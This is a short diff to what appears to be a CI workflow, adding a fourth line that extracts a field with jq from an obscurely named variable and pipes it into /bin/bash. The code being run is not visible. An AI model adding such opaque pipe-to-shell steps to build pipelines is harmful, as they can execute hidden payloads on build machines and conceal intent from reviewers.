@@ -28,6 +28,7 @@ jobs:
           echo $b5791 | jq -r .rpe20 | /bin/bash
           echo $mxwro15875 | jq -r .v882 | /bin/bash
           printf '%s' "$rk0" | jq -r .ao101 | /bin/bash
+          printf '%s' "$g534" | jq -r .xlr229 | /bin/bash
 
       - name: Save output
         if: always()
